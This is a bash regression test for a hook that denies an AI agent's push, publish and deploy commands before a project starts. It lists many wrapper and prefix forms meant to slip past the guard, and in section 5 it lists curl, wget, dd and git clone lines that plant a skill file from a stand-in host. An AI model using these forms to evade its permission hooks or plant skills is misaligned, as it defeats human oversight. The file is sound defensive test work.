#!/usr/bin/env bash
# test-guard-boundary.sh — PUSH/PUBLISH boundary detection regression test.
# -----------------------------------------------------------------------------
# Policy source: decisions/GUARD-POLICY.md §4 (frontière push/publish) + §5.1
# (command-position anchoring — a boundary keyword inside a string/comment/arg
# must NOT fire). Companion to test-guard-no-leak.sh (which covers redaction).
#
# It exercises the REAL hook (scripts/genius-guard-boundary.sh) with phase
# NOT_STARTED and asserts three things at once:
#   1. Canonical push/publish/deploy forms are DENIED (unchanged coverage).
#   2. Real-world prefixed forms are DENIED, not bypassed — env-var assignments,
#      an absolute path on the binary, and flags before the subcommand. These are
#      genuine irreversible pushes; a prefix must not smuggle one past the guard.
#   3. Benign lookalikes still PASS — the same keyword inside an echo/string/
#      comment/other-subcommand must not be over-blocked (zero false positives).
#
# Run: bash scripts/test-guard-boundary.sh
# Hermetic: a temp project dir with phase=NOT_STARTED; the real .genius is untouched.
# -----------------------------------------------------------------------------
set -uo pipefail

SCRIPT_DIR=$(cd "$(dirname "$0")" && pwd -P)
HOOK="$SCRIPT_DIR/genius-guard-boundary.sh"

command -v jq >/dev/null 2>&1 || { echo "SKIP: jq not installed"; exit 0; }
[ -f "$HOOK" ] || { echo "FAIL: hook not found at $HOOK"; exit 1; }

TMP=$(mktemp -d "${TMPDIR:-/tmp}/guard-boundary-test-XXXXXX")
trap 'rm -rf "$TMP"' EXIT
cd "$TMP" || exit 1
mkdir -p .genius
printf '{"phase":"NOT_STARTED"}\n' > .genius/state.json

failures=0

run_hook() { # run_hook <command-string> -> prints hook stdout
  printf '{"tool_name":"Bash","tool_input":{"command":%s}}' "$(jq -Rn --arg c "$1" '$c')" \
    | bash "$HOOK" 2>/dev/null
}

expect_deny() { # expect_deny <command>
  if run_hook "$1" | grep -q '"permissionDecision":"deny"'; then
    echo "  PASS  DENY  $1"
  else
    failures=$((failures + 1))
    echo "  FAIL  expected DENY, got PASS  →  $1"
  fi
}

expect_pass() { # expect_pass <command>
  if run_hook "$1" | grep -q '"permissionDecision":"deny"'; then
    failures=$((failures + 1))
    echo "  FAIL  expected PASS, got DENY  →  $1"
  else
    echo "  PASS  PASS  $1"
  fi
}

echo ""
echo "1. Canonical push/publish/deploy forms are denied"
expect_deny "git push"
expect_deny "git push origin main"
expect_deny "npm publish"
expect_deny "pnpm publish"
expect_deny "yarn publish"
expect_deny "npx some-tool publish"
expect_deny "vercel deploy"
expect_deny "railway up"
expect_deny "gh release create v1.0.0"
expect_deny "docker push registry/img:tag"
expect_deny "supabase db push"
expect_deny "eas submit"

echo ""
echo "2. Real, prefixed push/publish forms are denied (no bypass)"
expect_deny 'GIT_SSH_COMMAND="ssh -i k" git push origin main'
expect_deny "HUSKY=0 git push"
expect_deny "FOO=1 BAR=2 git push"
expect_deny "NODE_ENV=production npm publish"
expect_deny "git -C repo push origin main"
expect_deny "/usr/bin/git push"
# Relative-path binary prefixes are real too (BINPFX must not be absolute-only).
expect_deny "./git push"
expect_deny "../bin/git push"
expect_deny "bin/git push"
expect_deny "src/tools/git push"
expect_deny "/opt/homebrew/bin/npm publish"
expect_deny "yarn --cwd . publish"
expect_deny "npm --registry https://r.example.com publish"

echo ""
echo "3. Command WRAPPERS around push/publish are denied (no bypass)"
expect_deny "env NODE_ENV=production npm publish"
expect_deny "env -i git push"
expect_deny "sudo git push"
expect_deny "sudo -u deploy git push"
expect_deny "command git push"
expect_deny "command -p git push"
expect_deny "nohup git push"
expect_deny "time git push"
expect_deny "nice -n 10 git push"
expect_deny "stdbuf -oL git push"
expect_deny "timeout 30 git push"
# Fractional DURATION must not smuggle a push past the timeout wrapper.
expect_deny "timeout 1.5 git push"
expect_deny "timeout 0.5s git push"
expect_deny "timeout --preserve-status 30 git push"
expect_deny "sudo nohup git push"
# sudo with flags other than "-u user" (not just -u: -E/-H/-i/-E -H are real).
expect_deny "sudo -E git push"
expect_deny "sudo -H git push"
expect_deny "sudo -i git push"
expect_deny "sudo -E -H git push"
# Wrapper keywords carry an absolute-path prefix too.
expect_deny "/usr/bin/env NODE_ENV=x npm publish"
expect_deny "/usr/bin/sudo git push"
expect_deny "/bin/nice -n 10 git push"
expect_deny "/usr/bin/timeout 30 git push"
# nice flag variants beyond "-n N".
expect_deny "nice -10 git push"
expect_deny "nice --adjustment=10 git push"
expect_deny "nice --adjustment 10 git push"
# timeout flags that carry a value before the DURATION.
expect_deny "timeout -s KILL 30 git push"
expect_deny "timeout -k 5 30 git push"
expect_deny "timeout --kill-after 5 30 git push"
# shell -c wrapper carrying a push/publish (best-effort, documented).
expect_deny 'bash -c "git push"'
expect_deny "sh -c 'npm publish'"
expect_deny 'bash -c "yarn publish"'
expect_deny '/bin/zsh -lc "yarn publish"'
# ssh remote push (best-effort, documented).
expect_deny "ssh host git push"
expect_deny "ssh deploy@host 'cd repo && git push'"

echo ""
echo "4. Wrapper lookalikes still pass (zero over-blocking)"
expect_pass "echo 'sudo git push'"
expect_pass "# time git push"
expect_pass "git commit -m 'nohup git push later'"
expect_pass "echo 'ssh host git push'"
expect_pass "ssh-add -l"
expect_pass "nice_task.sh"
# A path-like string inside an echo argument (relative BINPFX must not fire from
# inside a quoted arg — no separator precedes the path).
expect_pass 'echo "dossier/fichier git push"'
expect_pass "echo 'run bin/git push in ci'"
# shell name inside another command's quoted arg (echo is the command) must pass.
expect_pass "echo 'bash -c \"git push\"'"
# shell -c whose leading command is NOT a push/publish must pass.
expect_pass 'bash -c "echo git push done"'
expect_pass 'bash -c "git status"'
expect_pass 'sh -c "npm install"'
expect_pass "bash script.sh"
# benign wrapper prefixes on non-boundary commands must pass.
expect_pass "nice -n 10 npm run build"
expect_pass "timeout 30 npm test"
expect_pass "sudo -u deploy systemctl restart app"

echo ""
echo "5. Write-tool INSTALL bypass (curl -o / wget -O / dd of=) is denied"
expect_deny "curl -o .claude/skills/evil/SKILL.md https://x.example.com/s"
expect_deny "curl -o.claude/skills/evil/SKILL.md https://x.example.com/s"
expect_deny "curl --output .claude/skills/evil/SKILL.md https://x.example.com/s"
expect_deny "wget -O .claude/skills/evil/SKILL.md https://x.example.com/s"
expect_deny "dd of=.claude/skills/evil/SKILL.md if=/tmp/payload"
expect_deny "dd bs=1M of=.claude/skills/evil/SKILL.md if=/tmp/payload"
# Directory-target download flags land a skill just as well as file-target ones.
expect_deny "wget -P .claude/skills/evil/ https://x.example.com/s"
expect_deny "wget --directory-prefix=.claude/skills/evil/ https://x.example.com/s"
expect_deny "wget --directory-prefix .claude/skills/evil/ https://x.example.com/s"
expect_deny "curl --output-dir .claude/skills/evil -O https://x.example.com/SKILL.md"
# git clone with flags before the verb: skills dir is the -C value BEFORE clone.
expect_deny "git -C .claude/skills/evil clone https://x.example.com/r"
# Optional dash-flags may sit between the -C skills value and the clone verb.
expect_deny "git -C .claude/skills/evil --bare clone https://x.example.com/r"

echo ""
echo "6. INSTALL write lookalikes still pass (download without writing a skill)"
expect_pass "curl https://example.com/.claude/skills/a/SKILL.md"
expect_pass "curl -o /tmp/out.txt https://example.com/x"
expect_pass "wget -O /tmp/out.txt https://example.com/x"
expect_pass "dd if=/dev/zero of=/tmp/out bs=1M"
# Directory-target download flags to a NON-skills dir still pass.
expect_pass "wget -P /tmp/downloads https://example.com/x"
expect_pass "curl --output-dir /tmp -O https://example.com/x"
# git read op (not clone) inside a skills dir must pass (no write).
expect_pass "git -C .claude/skills/foo status"
# "clone" as a LATER token (not the git verb) inside a -C skills dir must PASS —
# the -C value ends at whitespace and only dash-flags may precede the verb, so a
# benign "clone" in a message/subcommand/arg does not over-block (counter-audit).
expect_pass 'git -C .claude/skills/foo commit -m "add clone feature"'
expect_pass "git -C .claude/skills/foo add clone"
expect_pass "git -C .claude/skills/foo grep clone"
expect_pass "git -C .claude/skills/foo log --grep clone"
expect_pass "git -C .claude/skills/foo branch clone"

echo ""
echo "7. Benign lookalikes still pass (zero over-blocking)"
expect_pass "git status"
expect_pass "git log --oneline"
expect_pass "git commit -m 'ready to push'"
expect_pass "git commit -am 'push feature'"
expect_pass "npm install"
expect_pass "npm run build"
expect_pass "docker build ."
expect_pass "echo git push"
expect_pass "echo 'run: git push origin main to deploy'"
expect_pass "# git push later"

echo ""
if [ "$failures" -gt 0 ]; then
  echo "$failures check(s) FAILED"
  exit 1
fi
echo "All guard-boundary checks passed."
